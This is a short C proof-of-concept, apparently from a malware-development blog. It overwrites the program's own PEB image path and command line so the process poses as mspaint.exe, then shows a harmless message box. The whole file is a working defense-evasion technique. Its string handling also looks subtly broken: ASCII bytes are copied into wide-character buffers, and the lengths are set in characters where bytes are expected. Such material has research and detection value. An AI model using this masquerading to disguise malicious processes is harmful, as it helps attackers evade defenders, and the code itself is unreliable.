/*
 * hack.c - update process properties
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2024/04/09/malware-cryptography-26.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>
#include <winternl.h>

#ifndef _WIN64
  PPEB pPeb = (PPEB)__readfsdword(0x30);
#else
  PPEB pPeb = (PPEB)__readgsqword(0x60);
#endif // _WIN64

int main() {
  char desktopPath[MAX_PATH];

  // get the path to the Desktop directory
  HRESULT res1 = SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
  if (FAILED(res1)) {
    printf("unable to retrieve Desktop directory path :(\n");
    return -1;
  }

  // set the current directory to the Desktop dir
  if (!SetCurrentDirectoryA(desktopPath)) {
    printf("unable to set current directory to Desktop. :(\n");
    return -1;
  }

  // define the path to the executable
  const char* exePath = "C:\\Windows\\System32\\mspaint.exe";

  // update the ImagePathName and CommandLine in the PEB
  SIZE_T imagePathLen = strlen(exePath);
  if (imagePathLen >= pPeb->ProcessParameters->ImagePathName.MaximumLength ||
    imagePathLen >= pPeb->ProcessParameters->CommandLine.MaximumLength) {
    printf("path length exceeds buffer size :(\n");
    return -1;
  }

  // copy the path to ImagePathName and CommandLine buffers, ensuring null-termination
  memcpy(pPeb->ProcessParameters->ImagePathName.Buffer, exePath, imagePathLen);
  pPeb->ProcessParameters->ImagePathName.Buffer[imagePathLen] = '\0';
  pPeb->ProcessParameters->ImagePathName.Length = (USHORT)imagePathLen;

  memcpy(pPeb->ProcessParameters->CommandLine.Buffer, exePath, imagePathLen);
  pPeb->ProcessParameters->CommandLine.Buffer[imagePathLen] = '\0';
  pPeb->ProcessParameters->CommandLine.Length = (USHORT)imagePathLen;

  // Display a message box
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);

  return 0;
}
